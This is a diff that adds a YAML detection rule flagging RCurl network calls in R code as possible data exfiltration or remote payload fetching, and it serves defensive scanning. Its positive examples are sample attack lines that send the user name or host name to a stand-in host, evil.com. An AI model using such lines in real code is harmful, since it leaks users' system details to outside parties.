@@ -1,0 +1,44 @@
+name: rcurl_pattern
+version: "0.1.0"
+type: warning
+attck:
+  - T1041
+  - T1195.002
+message: >-
+  An RCurl network call sends an outbound HTTP request. A request may be used to
+  exfiltrate credentials or other data, or to fetch a remote payload.
+xpath: >-
+  //SYMBOL_FUNCTION_CALL[
+    (
+      text() = 'getURL' or text() = 'getURI' or text() = 'getForm' or
+      text() = 'postForm' or text() = 'curlPerform'
+    )
+    and not(preceding-sibling::OP-DOLLAR)
+    and not(preceding-sibling::OP-AT)
+  ]
+positive_examples:
+  - |
+    getURL("https://evil.com/evil")
+  - |
+    RCurl::getURL("https://evil.com/evil")
+  - |
+    getURI("https://evil.com/evil")
+  - |
+    RCurl::getURI("https://evil.com/evil")
+  - |
+    getForm("https://evil.com/evil", user = Sys.info()[["user"]])
+  - |
+    RCurl::getForm("https://evil.com/evil", user = Sys.info()[["user"]])
+  - |
+    postForm("https://evil.com/evil", host = Sys.info()[["nodename"]])
+  - |
+    RCurl::postForm("https://evil.com/evil", host = Sys.info()[["nodename"]])
+  - |
+    curlPerform(url = "https://evil.com/evil")
+  - |
+    RCurl::curlPerform(url = "https://evil.com/evil")
+negative_examples:
+  - |
+    foo$getURL("https://example.com")
+  - |
+    foo@postForm("https://example.com")
